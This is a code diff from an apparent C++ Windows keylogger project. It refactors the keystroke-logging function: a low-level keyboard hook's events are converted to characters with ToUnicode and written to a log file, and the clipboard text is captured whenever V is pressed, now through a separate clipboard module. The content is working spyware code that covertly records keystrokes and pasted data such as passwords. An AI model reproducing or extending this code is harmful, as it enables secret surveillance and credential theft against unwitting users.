@@ -1,6 +1,7 @@
 #include "keylogger.hpp"
 #include "keyboard.hpp"
 #include "configuration.hpp"
+#include "clipboard.hpp"
 #include "constants.hpp"
 
 // Logs the respective characters of the provided KBD hook.
@@ -23,7 +24,7 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 
         if (kbd_hook->vkCode == VK_V)
         {
-            write_clipboard_data(out_file);
+            out_file << clipboard::get_data();
         }
     }
     else
@@ -36,7 +37,7 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
         // keyboard layout and the current keyboard state.
         WCHAR key_buffer[PWSZ_BUFFER_SIZE];
         const auto result = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state,
-            key_buffer, PWSZ_BUFFER_SIZE, 0);
+                                      key_buffer, PWSZ_BUFFER_SIZE, 0);
 
         // If the conversion was successful, write the characters.
         if (result > 0)
@@ -47,22 +48,4 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 
     // Write all changes to the wofstream.
     out_file << std::flush;
-}
-
-// Acquires and writes the current clipboard data to the provided file.
-void keylogger::write_clipboard_data(std::wofstream& file)
-{
-    if (OpenClipboard(nullptr))
-    {
-        if (auto handle = GetClipboardData(CF_UNICODETEXT))
-        {
-            if (const auto data = GlobalLock(handle))
-            {
-                file << static_cast<WCHAR*>(data);
-                GlobalUnlock(handle);
-            }
-        }
-
-        CloseClipboard();
-    }
 }
